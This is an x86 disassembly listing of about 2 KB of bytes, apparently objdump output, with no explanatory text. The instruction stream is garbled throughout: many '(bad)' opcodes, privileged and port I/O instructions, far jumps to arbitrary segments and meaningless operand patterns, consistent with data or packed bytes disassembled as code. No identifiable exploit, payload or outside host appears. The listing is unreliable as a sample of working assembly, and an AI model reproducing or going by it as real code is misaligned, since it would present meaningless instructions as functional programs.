  41ed6b:	mov    dl,0x70
  41ed6d:	sbb    eax,DWORD PTR [edx+0x73]
  41ed70:	adc    DWORD PTR [ecx+0x40a4d528],ebp
  41ed76:	je     0x41edab
  41ed78:	sbb    eax,DWORD PTR [eax-0xa8175e3]
  41ed7e:	mov    ah,0x8d
  41ed80:	aad    0x4f
  41ed82:	push   ebp
  41ed83:	(bad)  
  41ed84:	mov    DWORD PTR es:[edi],esi
  41ed87:	hlt    
  41ed88:	jecxz  0x41ed10
  41ed8a:	dec    eax
  41ed8b:	sti    
  41ed8c:	adc    DWORD PTR [eax+ecx*4+0x1b],edx
  41ed90:	(bad)  
  41ed91:	ficom  DWORD PTR [esi]
  41ed93:	inc    ecx
  41ed94:	dec    esp
  41ed95:	les    edx,FWORD PTR [esi-0x6ea1a7ad]
  41ed9b:	test   BYTE PTR [edx+0x0],cl
  41ed9e:	ror    DWORD PTR [ecx+eax*1+0x72],1
  41eda2:	lea    edi,[edx-0x42]
  41eda5:	xchg   esp,eax
  41eda6:	stos   BYTE PTR es:[edi],al
  41eda7:	xchg   edi,eax
  41eda8:	icebp  
  41eda9:	outs   dx,BYTE PTR ds:[esi]
  41edaa:	inc    ebp
  41edab:	call   0x1770:0x6ca75b06
  41edb2:	fwait
  41edb3:	test   al,0xa2
  41edb5:	stc    
  41edb6:	inc    esi
  41edb7:	fmul   DWORD PTR [eax+0xd]
  41edba:	sub    al,0xdf
  41edbc:	mov    cs,ecx
  41edbe:	inc    esp
  41edbf:	lods   eax,DWORD PTR ds:[esi]
  41edc0:	mov    dl,0x9a
  41edc2:	test   eax,0x1e2499c6
  41edc7:	fxch   st(3)
  41edc9:	adc    edi,eax
  41edcb:	sbb    edi,DWORD PTR [ecx-0x6309781f]
  41edd1:	fs mov eax,edx
  41edd4:	mov    ch,ch
  41edd6:	aas    
  41edd7:	lea    edi,[eax]
  41edd9:	out    0x4d,al
  41eddb:	xchg   ebp,eax
  41eddc:	cmp    al,0x9e
  41edde:	test   eax,0xc288c883
  41ede3:	add    eax,esi
  41ede5:	fsub   DWORD PTR [ebp+0xbe8d27b]
  41edeb:	aad    0x45
  41eded:	pop    eax
  41edee:	(bad)  
  41edef:	imul   eax,esp,0x575174e0
  41edf5:	clc    
  41edf6:	and    eax,0xaeca4235
  41edfb:	and    eax,0x4855cc5e
  41ee00:	neg    BYTE PTR [edx]
  41ee02:	daa    
  41ee03:	inc    ecx
  41ee04:	imul   edx,DWORD PTR [ebp+ebp*4+0x1dd7374e],0x33
  41ee0c:	sti    
  41ee0d:	sbb    al,0xf
  41ee0f:	fbld   TBYTE PTR [esi+0x35]
  41ee12:	push   0xffffffe5
  41ee14:	add    edx,DWORD PTR [ebp-0xd]
  41ee17:	jmp    0x60ea0222
  41ee1c:	mov    ds:0x2b780735,eax
  41ee21:	cwde   
  41ee22:	cmp    BYTE PTR [ebx],ah
  41ee24:	popf   
  41ee25:	cli    
  41ee26:	mov    WORD PTR [eax-0x5f85f4a8],cs
  41ee2c:	cmp    esi,DWORD PTR [edx+0x101d1105]
  41ee32:	(bad)  
  41ee33:	in     eax,0x67
  41ee35:	mov    eax,ds:0xd0976b16
  41ee3a:	mov    ecx,0xd415d0ae
  41ee3f:	mov    ecx,0xabf40028
  41ee44:	and    ebp,DWORD PTR [ebp-0x5e]
  41ee47:	sbb    DWORD PTR [esi+0x11],esp
  41ee4a:	addr16 fcmovnbe st,st(2)
  41ee4d:	jnp    0x41ee2c
  41ee4f:	fdivr  DWORD PTR [edi-0x5da69990]
  41ee55:	retf   0xf5dd
  41ee58:	out    0xd2,al
  41ee5a:	(bad)  
  41ee5b:	adc    BYTE PTR [eax-0x68f204f1],ch
  41ee61:	mov    bh,0x7b
  41ee63:	jecxz  0x41eedb
  41ee65:	sbb    al,0x8e
  41ee67:	pop    DWORD PTR [esi-0x15]
  41ee6a:	push   ecx
  41ee6b:	cwde   
  41ee6c:	lds    esp,FWORD PTR [ebx+0xd8efd92]
  41ee72:	cmc    
  41ee73:	sub    DWORD PTR [ecx+0xb],ebp
  41ee76:	icebp  
  41ee77:	pop    edx
  41ee78:	mov    eax,ds:0x5a3a6e58
  41ee7d:	mov    al,0xaa
  41ee7f:	jge    0x41ee8a
  41ee81:	jnp    0x41ee2d
  41ee83:	dec    ecx
  41ee84:	inc    esi
  41ee85:	(bad)  
  41ee86:	test   al,0x85
  41ee88:	imul   edi,DWORD PTR [edx-0x14],0x4256b2cd
  41ee8f:	and    esi,esi
  41ee91:	std    
  41ee92:	inc    edi
  41ee93:	inc    edx
  41ee94:	imul   ebp,esi,0x61
  41ee97:	sbb    DWORD PTR [edx-0x6443bb34],eax
  41ee9d:	xchg   DWORD PTR [ebx+0x2b],eax
  41eea0:	stc    
  41eea1:	add    al,0x18
  41eea3:	sbb    ebx,DWORD PTR [esp+edx*2-0x667509e4]
  41eeaa:	mov    esi,0x6c037df4
  41eeaf:	jmp    0x8538:0xd1e92928
  41eeb6:	sbb    eax,0xf076f7fc
  41eebb:	cld    
  41eebc:	inc    DWORD PTR [edi+0x71]
  41eebf:	mov    WORD PTR [edi+0x38df134c],?
  41eec5:	das    
  41eec6:	dec    esp
  41eec7:	jbe    0x41ee65
  41eec9:	sti    
  41eeca:	dec    ebp
  41eecb:	out    0x8d,eax
  41eecd:	shl    DWORD PTR [ebx],0xfd
  41eed0:	lock leave 
  41eed2:	jo     0x41ee64
  41eed4:	dec    DWORD PTR ds:0xbcdc9e17
  41eeda:	cld    
  41eedb:	adc    al,0x98
  41eedd:	ret    0xdd6e
  41eee0:	repz mov ds:0xc2260c57,al
  41eee6:	jmp    DWORD PTR [ecx]
  41eee8:	loope  0x41ef07
  41eeea:	sub    esp,DWORD PTR [edx]
  41eeec:	sub    ebp,DWORD PTR [ecx]
  41eeee:	test   BYTE PTR [ebp-0x1],0x79
  41eef2:	gs test eax,0xdab101fb
  41eef8:	inc    ecx
  41eef9:	push   edi
  41eefa:	(bad)  
  41eefb:	(bad)  
  41eefc:	push   ebp
  41eefd:	int3   
  41eefe:	dec    ebx
  41eeff:	pop    ecx
  41ef00:	int3   
  41ef01:	jnp    0x41eee2
  41ef03:	in     al,0x90
  41ef05:	fst    QWORD PTR [edx+0x2b]
  41ef08:	mov    dl,0x98
  41ef0a:	xchg   edx,eax
  41ef0b:	cmp    DWORD PTR [ebx-0xf0dd96b],esi
  41ef11:	popf   
  41ef12:	adc    edx,DWORD PTR [ecx+0x1e818116]
  41ef18:	inc    edx
  41ef19:	outs   dx,DWORD PTR ds:[esi]
  41ef1a:	sub    eax,0xe7e0d179
  41ef1f:	inc    esi
  41ef20:	xor    eax,0x5267d78a
  41ef25:	idiv   DWORD PTR [ecx-0x75a8e860]
  41ef2b:	ret    0x52c0
  41ef2e:	sub    eax,0x3be2c97f
  41ef33:	(bad)  
  41ef34:	add    esi,eax
  41ef36:	mov    cl,0xec
  41ef38:	pop    ds
  41ef39:	stos   DWORD PTR es:[edi],eax
  41ef3a:	pop    edi
  41ef3b:	popa   
  41ef3c:	push   esp
  41ef3d:	mov    cl,0xcf
  41ef3f:	mov    dl,BYTE PTR ds:0x1c89bac3
  41ef45:	cld    
  41ef46:	repz mov edi,0x54106885
  41ef4c:	cs loope 0x41ef4b
  41ef4f:	lods   al,BYTE PTR ds:[esi]
  41ef50:	popf   
  41ef51:	and    BYTE PTR [edi-0x6163b149],ah
  41ef57:	ret    
  41ef58:	jne    0x41ef0d
  41ef5a:	lahf   
  41ef5b:	cdq    
  41ef5c:	ds shr ah,cl
  41ef5f:	out    dx,eax
  41ef60:	(bad)  [ebp+edi*2+0x32]
  41ef64:	pop    ss
  41ef65:	jg     0x41ef3d
  41ef67:	lock jmp 0xfc93:0x806a101c
  41ef6f:	xchg   edi,eax
  41ef70:	arpl   WORD PTR [ebx],si
  41ef72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef73:	imul   si,si,0x7644
  41ef78:	fistp  QWORD PTR [ecx-0x44]
  41ef7b:	xor    eax,0xc144de48
  41ef80:	push   ss
  41ef81:	jnp    0x41ef59
  41ef83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef84:	cmp    ch,0x69
  41ef87:	cs fwait
  41ef89:	add    DWORD PTR ss:[ecx],ebp
  41ef8c:	cmp    eax,0x8a3d3047
  41ef91:	ins    DWORD PTR es:[edi],dx
  41ef92:	and    esi,DWORD PTR [eax-0x51]
  41ef95:	mov    al,ds:0xc1d3f5b0
  41ef9a:	jl     0x41efe8
  41ef9c:	outs   dx,DWORD PTR ds:[esi]
  41ef9d:	pop    ss
  41ef9e:	mov    fs,WORD PTR [ebp-0x39fbd68a]
  41efa4:	or     ch,BYTE PTR [eax-0x77]
  41efa7:	sub    al,0xde
  41efa9:	sti    
  41efaa:	sahf   
  41efab:	jp     0x41f00c
  41efad:	mov    ds:0x4dac258a,al
  41efb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efb3:	cdq    
  41efb4:	retw   
  41efb6:	sbb    eax,0x37030192
  41efbb:	int    0x29
  41efbd:	and    eax,0xc6bfa289
  41efc2:	push   0x3f8d3ced
  41efc7:	sbb    al,cl
  41efc9:	push   0xbb8513f5
  41efce:	jns    0x41ef73
  41efd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efd1:	lods   eax,DWORD PTR ds:[esi]
  41efd2:	jne    0x41ef75
  41efd4:	adc    eax,0x5fecde6
  41efd9:	in     eax,dx
  41efda:	fst    DWORD PTR [ecx-0x37]
  41efdd:	cmp    al,0x6e
  41efdf:	cmp    al,0xdf
  41efe1:	popf   
  41efe2:	shl    DWORD PTR [ebx-0x665cade2],0xdf
  41efe9:	xor    esp,0x3c
  41efec:	int    0x66
  41efee:	iret   
  41efef:	xchg   esi,eax
  41eff0:	add    DWORD PTR [edx+0x19f867a0],ebx
  41eff6:	(bad)  
  41eff7:	int    0x73
  41eff9:	(bad)  
  41effb:	enter  0x267c,0x91
  41efff:	loopne 0x41efeb
  41f001:	jge    0x41f039
  41f003:	ret    0x4cb2
  41f006:	mov    ds:0x43f15ba3,al
  41f00b:	xor    al,0xf7
  41f00d:	xchg   ecx,eax
  41f00e:	xor    DWORD PTR [ebx+0x77],edi
  41f011:	add    cl,dh
  41f013:	and    DWORD PTR [ebp+0x68],edi
  41f016:	inc    esp
  41f017:	mov    bl,0xe8
  41f019:	or     BYTE PTR [eax+eax*4],cl
  41f01c:	mov    ds:0x2b3f634,eax
  41f021:	or     edx,0xffffff8e
  41f024:	xor    eax,DWORD PTR [ecx]
  41f026:	adc    DWORD PTR [ebp-0x3d],ebx
  41f029:	clc    
  41f02a:	mov    dl,0x11
  41f02c:	data16 dec al
  41f02f:	scas   al,BYTE PTR es:[edi]
  41f030:	fnstcw WORD PTR [ecx+0x23bd88df]
  41f036:	pushf  
  41f037:	pop    eax
  41f038:	dec    ecx
  41f039:	fidivr DWORD PTR [edx+0x53]
  41f03c:	xor    DWORD PTR [edx],0xfffffffd
  41f03f:	pushf  
  41f040:	daa    
  41f041:	xchg   BYTE PTR [edi+0x50],al
  41f044:	push   esp
  41f045:	and    eax,0xaa7ab6b4
  41f04a:	js     0x41f058
  41f04c:	push   cs
  41f04d:	push   esi
  41f04e:	mov    ds:0x41ba1e9,eax
  41f053:	jp     0x41efe7
  41f055:	mov    WORD PTR [ebp-0x11],ds
  41f058:	jae    0x41f0b3
  41f05a:	sbb    esp,DWORD PTR [edi-0x54f74de6]
  41f060:	inc    ecx
  41f061:	(bad)  
  41f062:	out    dx,al
  41f063:	scas   eax,DWORD PTR es:[edi]
  41f064:	xchg   ebx,eax
  41f065:	sbb    bl,BYTE PTR [edi-0x1f266839]
  41f06b:	mov    ss,WORD PTR [esi-0x36676d50]
  41f071:	lahf   
  41f072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f073:	push   ds
  41f074:	enter  0xb1ef,0x14
  41f078:	mov    dl,0xdb
  41f07a:	test   DWORD PTR [edi+0x32b0b6f0],ecx
  41f080:	jb     0x41f008
  41f082:	sub    al,0x5d
  41f084:	jno    0x41f079
  41f086:	pop    ebp
  41f087:	push   eax
  41f088:	xchg   bl,bl
  41f08a:	push   edi
  41f08b:	or     bh,BYTE PTR [esi]
  41f08d:	push   cs
  41f08e:	imul   DWORD PTR [ecx+0xd5a275]
  41f094:	imul   DWORD PTR [esi]
  41f096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f097:	mov    esp,0x2ca30dce
  41f09c:	mov    esi,0x5bceb0af
  41f0a1:	ds lahf 
  41f0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0a4:	xlat   BYTE PTR ds:[ebx]
  41f0a5:	xor    ebp,DWORD PTR [ebx-0x7f25b3e9]
  41f0ab:	popf   
  41f0ac:	nop
  41f0ad:	pop    ds
  41f0ae:	rol    eax,0x28
  41f0b1:	inc    esp
  41f0b2:	mov    esi,0xf310b91b
  41f0b7:	inc    edi
  41f0b8:	addr16 dec ebx
  41f0ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0bb:	jle    0x41f0ba
  41f0bd:	mov    esi,ebp
  41f0bf:	fs jmp 0x41f0a9
  41f0c2:	std    
  41f0c3:	pop    ds
  41f0c4:	loopne 0x41f04a
  41f0c6:	xchg   ecx,eax
  41f0c7:	mov    cl,0x28
  41f0c9:	jmp    0x41f0b9
  41f0cb:	pop    edi
  41f0cc:	sub    DWORD PTR [esi+0x321ffd51],esp
  41f0d2:	ret    0xab25
  41f0d5:	leave  
  41f0d6:	rcl    BYTE PTR [ebp+0x39],0xba
  41f0da:	inc    edx
  41f0db:	loop   0x41f131
  41f0dd:	test   al,0xe6
  41f0df:	sub    ch,BYTE PTR [ebp+0x58]
  41f0e2:	ret    
  41f0e3:	sub    DWORD PTR [edi+esi*2],esp
  41f0e6:	mov    ah,0x79
  41f0e8:	aaa    
  41f0e9:	mov    eax,0xd864553d
  41f0ee:	adc    DWORD PTR [eax-0x4a],esi
  41f0f1:	ss ins DWORD PTR es:[edi],dx
  41f0f3:	jbe    0x41f091
  41f0f5:	sub    al,0x19
  41f0f8:	rcl    DWORD PTR [edi-0x20],cl
  41f0fb:	div    BYTE PTR [ebp+0x107fa571]
  41f101:	and    eax,0x112552de
  41f106:	mov    al,ds:0x491aad31
  41f10b:	mov    di,?
  41f10e:	push   eax
  41f10f:	push   eax
  41f110:	(bad)  
  41f111:	xlat   BYTE PTR ds:[ebx]
  41f112:	mov    ebp,0x89ee1da8
  41f117:	mov    edx,0x401c876
  41f11c:	fwait
  41f11d:	mov    edx,DWORD PTR [ebx+0x5]
  41f120:	idiv   BYTE PTR [esi+edi*4+0x12]
  41f124:	and    ebx,DWORD PTR ds:0xa59bca73
  41f12a:	test   cl,cl
  41f12c:	scas   al,BYTE PTR es:[edi]
  41f12d:	jb     0x41f12d
  41f12f:	cdq    
  41f130:	mov    dh,0x37
  41f132:	loop   0x41f111
  41f134:	jns    0x41f114
  41f136:	pop    edi
  41f137:	rol    DWORD PTR [ebp-0x741f35c1],cl
  41f13d:	jl     0x41f198
  41f13f:	adc    BYTE PTR [ecx],al
  41f141:	push   ss
  41f142:	or     ebx,ebp
  41f144:	out    dx,eax
  41f145:	jp     0x41f1c5
  41f147:	test   BYTE PTR [edi-0x2a74686a],ah
  41f14d:	enter  0xa04e,0x6d
  41f151:	adc    bh,ah
  41f153:	push   ecx
  41f154:	inc    esi
  41f155:	pop    ds
  41f156:	xchg   esi,eax
  41f157:	popa   
  41f158:	lahf   
  41f159:	into   
  41f15a:	mov    ch,0x4a
  41f15c:	add    esi,DWORD PTR [edi*8-0x3ccde659]
  41f163:	cmp    bh,BYTE PTR [eax-0x1b]
  41f166:	addr16 jge 0x41f187
  41f169:	inc    ecx
  41f16a:	pop    ebp
  41f16b:	push   ebx
  41f16c:	mov    edi,0xcf0dc78
  41f171:	jne    0x41f1c0
  41f173:	mov    al,BYTE PTR [eax-0x38]
  41f176:	ret    0xb0f4
  41f179:	jmp    0xf0778d0e
  41f17e:	fidiv  WORD PTR [esi]
  41f180:	add    BYTE PTR [esi+edx*4],ch
  41f183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f184:	mov    edi,0xc84a0d51
  41f189:	mov    DWORD PTR [ecx-0x51],esp
  41f18c:	sti    
  41f18d:	div    BYTE PTR [edi-0x9]
  41f190:	xchg   ebx,eax
  41f191:	pop    edx
  41f192:	mov    edi,0xc3b8872a
  41f197:	inc    edi
  41f198:	xor    DWORD PTR ss:0x72aed2f,0x1c
  41f1a0:	(bad)  
  41f1a2:	and    ebx,DWORD PTR [esi-0x69]
  41f1a5:	pop    esi
  41f1a6:	(bad)  
  41f1a7:	fimul  WORD PTR [edx-0x6f]
  41f1aa:	cmp    dh,BYTE PTR [eax]
  41f1ac:	mov    edi,0x6303e23c
  41f1b1:	dec    edx
  41f1b2:	call   0x62ab:0x481a1722
  41f1b9:	jae    0x41f1a2
  41f1bb:	div    DWORD PTR [esi-0x106fdcb8]
  41f1c1:	test   edx,esp
  41f1c3:	push   0x16cf4325
  41f1c8:	jbe    0x41f14b
  41f1ca:	mov    dh,BYTE PTR [edx-0x18ba7c46]
  41f1d0:	sub    al,0xb6
  41f1d2:	mov    bh,0xfd
  41f1d4:	pusha  
  41f1d5:	sub    eax,DWORD PTR [edx]
  41f1d7:	loop   0x41f19e
  41f1d9:	xchg   esi,eax
  41f1da:	ds cmp ecx,DWORD PTR fs:[ecx-0x31]
  41f1df:	pushf  
  41f1e0:	inc    ebx
  41f1e1:	xchg   edx,eax
  41f1e2:	lods   al,BYTE PTR ds:[esi]
  41f1e3:	jmp    0x54c2:0xd1d686d
  41f1ea:	xor    ecx,DWORD PTR [esi-0x31]
  41f1ed:	aad    0x92
  41f1ef:	jl     0x41f1aa
  41f1f1:	stos   BYTE PTR es:[edi],al
  41f1f2:	fs cmp al,0x68
  41f1f5:	bnd cs jb 0x41f1b2
  41f1f9:	int3   
  41f1fa:	test   eax,0xee14835e
  41f1ff:	jb     0x41f1f1
  41f201:	dec    esp
  41f202:	cld    
  41f203:	scas   al,BYTE PTR es:[edi]
  41f204:	lds    esp,FWORD PTR [ecx]
  41f206:	jns    0x41f1eb
  41f208:	js     0x41f261
  41f20a:	out    0xf7,al
  41f20c:	mov    ebx,0x57d2681c
  41f211:	push   esp
  41f212:	cmp    al,0x4e
  41f214:	mov    esp,0x7e3081db
  41f219:	push   ebx
  41f21a:	or     edi,ecx
  41f21c:	jmp    0x41f281
  41f21e:	xchg   edi,eax
  41f21f:	aas    
  41f220:	push   edi
  41f221:	xchg   esp,eax
  41f222:	sub    DWORD PTR cs:[eax+0x49f9e9ac],ebp
  41f229:	lods   eax,DWORD PTR ds:[esi]
  41f22a:	push   0x82f0cac
  41f22f:	adc    edi,eax
  41f231:	int3   
  41f232:	fisttp DWORD PTR [bx+0x63af]
  41f237:	mov    ebx,0xc7a27d15
  41f23c:	pop    edi
  41f23d:	sbb    BYTE PTR [ecx-0xead4eea],dl
  41f243:	cli    
  41f244:	mov    bh,0x39
  41f246:	inc    ebx
  41f247:	popf   
  41f248:	retf   
  41f249:	cmp    al,0x66
  41f24b:	sub    DWORD PTR [eax-0x61],ecx
  41f24e:	fisttp QWORD PTR [edi]
  41f250:	(bad)  
  41f251:	jmp    0x1140caf8
  41f256:	je     0x41f24f
  41f258:	aas    
  41f259:	test   al,0x94
  41f25b:	stos   DWORD PTR es:[edi],eax
  41f25c:	retf   
  41f25d:	adc    BYTE PTR [eax+0x1f],ch
  41f260:	sti    
  41f261:	aaa    
  41f262:	fdivr  DWORD PTR [ebx+0x3d]
  41f265:	out    dx,al
  41f266:	xchg   edx,eax
  41f267:	out    dx,eax
  41f268:	das    
  41f269:	loopne 0x41f1f0
  41f26b:	les    ebx,FWORD PTR ds:0xfee18595
  41f271:	adc    bl,0x56
  41f274:	int3   
  41f275:	(bad)  
  41f276:	rcl    DWORD PTR [esi],cl
  41f278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f279:	lods   al,BYTE PTR ds:[esi]
  41f27a:	cmp    BYTE PTR [edi],al
  41f27c:	pop    ebx
  41f27d:	xor    eax,0xc9d7cf2a
  41f282:	jmp    DWORD PTR [ebx]
  41f284:	in     eax,dx
  41f285:	mov    bl,0x46
  41f287:	and    DWORD PTR [ebx],edx
  41f289:	or     al,0xaa
  41f28b:	in     eax,0x95
  41f28d:	pop    ecx
  41f28e:	or     bl,0x17
  41f291:	retf   
  41f292:	mov    al,ds:0x3cb5d2ca
  41f297:	sub    al,0x4e
  41f299:	mov    ds:0xeebd6227,eax
  41f29e:	cld    
  41f29f:	pop    ds
  41f2a0:	fmul   DWORD PTR [ebx-0x26ee2b9a]
  41f2a6:	inc    edx
  41f2a7:	and    ch,BYTE PTR [ecx+0x37]
  41f2aa:	ss inc edx
  41f2ac:	mov    esi,0x920cbe3d
  41f2b1:	jle    0x41f245
  41f2b3:	cmp    DWORD PTR [esi],edx
  41f2b5:	imul   edi,DWORD PTR [ecx-0x433f807],0x7e6ff5da
  41f2bf:	sti    
  41f2c0:	loop   0x41f2e0
  41f2c2:	xchg   ecx,eax
  41f2c3:	sub    esi,DWORD PTR [ebp-0xbbdfdb]
  41f2c9:	mov    ecx,DWORD PTR [ecx-0x70]
  41f2cc:	mov    WORD PTR [edx+0x6c374fc7],?
  41f2d2:	ret    0x6039
  41f2d5:	sub    ah,BYTE PTR [eax]
  41f2d7:	mov    ch,0xfb
  41f2d9:	xor    esi,DWORD PTR [ecx-0x46]
  41f2dc:	test   DWORD PTR [esi-0x27],0xe6df7be8
  41f2e3:	fist   DWORD PTR [edx-0x2a0aef53]
  41f2e9:	xchg   edi,eax
  41f2ea:	fdivr  st,st(3)
  41f2ec:	bound  ebp,QWORD PTR [eax-0x7f]
  41f2ef:	jl     0x41f2dd
  41f2f1:	push   ss
  41f2f2:	pop    ebx
  41f2f3:	or     ebp,ecx
  41f2f5:	mov    ch,0xe9
  41f2f7:	loope  0x41f294
  41f2f9:	lods   eax,DWORD PTR ds:[esi]
  41f2fa:	mov    ch,ch
  41f2fc:	(bad)  
  41f2fd:	scas   eax,DWORD PTR es:[edi]
  41f2fe:	mov    edi,0xffa24bed
  41f303:	cmp    al,0xfa
  41f305:	jmp    0xfedb228
  41f30a:	inc    esp
  41f30b:	sub    DWORD PTR [ecx+0x6d],ecx
  41f30e:	repz fild DWORD PTR [edi+eax*2-0x1976883b]
  41f316:	loope  0x41f2ec
  41f318:	das    
  41f319:	fst    QWORD PTR [edx-0x1ea83af8]
  41f31f:	shl    DWORD PTR [eax+esi*8],1
  41f322:	xchg   ebp,eax
  41f323:	mov    esi,0x77f8e9e5
  41f328:	ret    0xfa2e
  41f32b:	shr    edi,0xeb
  41f32e:	mov    esp,0x9dc84171
  41f333:	push   ebx
  41f334:	popa   
  41f335:	mov    cl,0x25
  41f337:	xor    DWORD PTR [edi+0x614bd648],eax
  41f33d:	jnp    0x41f2f9
  41f33f:	jg     0x41f39e
  41f341:	pop    es
  41f342:	mov    edx,0xef3a0760
  41f347:	adc    al,0xda
  41f349:	add    eax,0x7218ccf2
  41f34e:	lahf   
  41f34f:	or     bl,BYTE PTR [ebx-0x65]
  41f352:	das    
  41f353:	push   ebx
  41f354:	icebp  
  41f355:	or     ecx,DWORD PTR [eax+0x74]
  41f358:	mov    ecx,0x482fbbca
  41f35d:	leave  
  41f35e:	(bad)  
  41f35f:	daa    
  41f360:	(bad)  
  41f362:	inc    edi
  41f363:	pop    esp
  41f364:	in     al,0xb9
  41f366:	rcr    ah,cl
  41f368:	mov    ebp,0xf6e6fb51
  41f36d:	cdq    
  41f36e:	mov    bl,0x89
  41f370:	lea    esi,[eax-0x432aa655]
  41f376:	or     ah,BYTE PTR [edi-0x40684b19]
  41f37c:	lods   al,BYTE PTR ds:[esi]
  41f37d:	jns    0x41f3a2
  41f37f:	into   
  41f380:	out    dx,eax
  41f381:	pop    esi
  41f382:	xchg   DWORD PTR [ecx+0x6f],esp
  41f385:	fcom   DWORD PTR [eax+0x58]
  41f388:	outs   dx,DWORD PTR ds:[esi]
  41f389:	(bad)  
  41f38b:	mov    esp,0xa533b7e4
  41f390:	fld    TBYTE PTR [ecx+ebx*1-0x5e]
  41f394:	pop    ds
  41f395:	fidivr WORD PTR [ebp+0x1ef5fae2]
  41f39b:	mul    DWORD PTR [ecx+0x496bc5a8]
  41f3a1:	mov    edx,0xb9db4b63
  41f3a6:	sbb    al,0x25
  41f3a8:	loop   0x41f3ce
  41f3aa:	aaa    
  41f3ab:	cmp    esp,DWORD PTR [edx-0x50]
  41f3ae:	ins    DWORD PTR es:[edi],dx
  41f3af:	mov    esi,0x4038795c
  41f3b4:	out    0x9a,eax
  41f3b6:	jmp    0x41f3da
  41f3b8:	mov    esi,0x80f57303
  41f3bd:	pop    esp
  41f3be:	dec    edx
  41f3bf:	mov    ah,0xf9
  41f3c1:	sub    eax,0xd61b43b3
  41f3c6:	or     DWORD PTR [edi],ebx
  41f3c8:	std    
  41f3c9:	cmp    eax,0xf8de2a22
  41f3ce:	xlat   BYTE PTR es:[ebx]
  41f3d0:	inc    esi
  41f3d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3d3:	pop    ebx
  41f3d4:	aam    0x8c
  41f3d6:	je     0x41f41b
  41f3d8:	repnz mov bh,0x63
  41f3db:	outs   dx,BYTE PTR ds:[esi]
  41f3dc:	pop    esi
  41f3dd:	push   ebp
  41f3de:	and    DWORD PTR [ebp+0x27],0xe80b3c13
  41f3e5:	cs jecxz 0x41f3af
  41f3e8:	jb     0x41f39f
  41f3ea:	leave  
  41f3eb:	(bad)  [edi-0x38]
  41f3ee:	jecxz  0x41f3ed
  41f3f0:	jno    0x41f386
  41f3f2:	ret    
  41f3f3:	xchg   esp,eax
  41f3f4:	ret    0x2438
  41f3f7:	(bad)
  41f3fa:	ja     0x41f41f
  41f3fc:	cli    
  41f3fd:	add    DWORD PTR [ebx+0x7b],ebp
  41f400:	or     al,0x3e
  41f402:	xchg   esp,eax
  41f403:	icebp  
  41f404:	push   esp
  41f405:	int    0xad
  41f407:	pop    ss
  41f408:	dec    ebp
  41f409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f40a:	dec    eax
  41f40b:	inc    ebp
  41f40c:	sbb    eax,0x4c60cf4c
  41f411:	add    ah,bh
  41f413:	lods   al,BYTE PTR ds:[esi]
  41f414:	popa   
  41f415:	mov    al,ds:0x96d2e98
  41f41a:	mov    DWORD PTR [edx-0x13],eax
  41f41d:	mov    ecx,0x972f2645
  41f422:	loopne 0x41f3e8
  41f424:	pop    edi
  41f425:	jnp    0x41f45e
  41f427:	pop    ebx
  41f428:	pop    esi
  41f429:	lods   al,BYTE PTR ds:[esi]
  41f42a:	aam    0xd4
  41f42c:	call   0xd271:0xedbb24f1
  41f433:	and    DWORD PTR [ebx],esi
  41f435:	and    al,0xd3
  41f437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f438:	shr    BYTE PTR [edx+0x52],1
  41f43b:	fisubr DWORD PTR [edi+edx*2-0x18]
  41f43f:	rcl    BYTE PTR [ecx],1
  41f441:	retf   0x1e35
  41f444:	mov    ds:0x525b7ace,eax
  41f449:	mov    esp,0xe8cbb6d9
  41f44e:	sub    al,0xe6
  41f450:	add    DWORD PTR [eax+0x5820f021],ebx
  41f456:	lods   eax,DWORD PTR ds:[esi]
  41f457:	pop    ecx
  41f458:	sbb    al,BYTE PTR ds:0x84fb54d2
  41f45e:	inc    edx
  41f45f:	(bad)  [edi+ebx*8+0x2ddaa54f]
  41f466:	sub    dh,BYTE PTR [ecx-0x2bdca7dd]
  41f46c:	mov    edx,0x32d9412d
  41f471:	adc    ch,BYTE PTR [esi]
  41f473:	mov    DWORD PTR [eax+0x48],0x53f8b579
  41f47a:	mov    ebx,DWORD PTR [esi]
  41f47c:	dec    edi
  41f47d:	jmp    DWORD PTR [esi-0x2d]
  41f480:	push   cs
  41f481:	and    eax,0x48645a0
  41f486:	cmp    ah,BYTE PTR [edi+0x27654c5]
  41f48c:	jle    0x41f461
  41f48e:	inc    ebp
  41f48f:	push   cs
  41f490:	push   ecx
  41f491:	mov    al,0xa0
  41f493:	fisub  WORD PTR [ebx-0x37]
  41f496:	outs   dx,DWORD PTR ds:[esi]
  41f497:	pop    ebx
  41f498:	sub    ebp,DWORD PTR [esi]
  41f49a:	jl     0x41f4c6
  41f49c:	xor    edx,DWORD PTR [eax]
  41f49e:	repnz mov cl,0x5a
  41f4a1:	mov    cl,0xa7
  41f4a3:	adc    BYTE PTR [edx+0x1e1780a3],0xd9
  41f4aa:	mov    ch,0xf2
  41f4ac:	dec    ebp
  41f4ad:	ja     0x41f47d
  41f4af:	in     eax,dx
  41f4b0:	jnp    0x41f49b
  41f4b2:	outs   dx,DWORD PTR ds:[esi]
  41f4b3:	lods   al,BYTE PTR ds:[esi]
  41f4b4:	paddsw mm6,mm6
  41f4b7:	pop    ds
  41f4b8:	pop    esi
  41f4b9:	inc    ecx
  41f4ba:	loopne 0x41f468
  41f4bc:	mov    ch,0x42
  41f4be:	dec    esi
  41f4bf:	imul   ebp,DWORD PTR [eax+eax*4],0x9942e726
  41f4c6:	push   ds
  41f4c7:	scas   eax,DWORD PTR es:[edi]
  41f4c8:	dec    ecx
  41f4c9:	inc    ebp
  41f4ca:	lea    ecx,[ecx-0x16]
  41f4cd:	jl     0x41f4ed
  41f4cf:	cli    
  41f4d0:	push   0x47
  41f4d2:	mov    edi,0x5116d933
  41f4d7:	mov    ds:0x5a4c0406,al
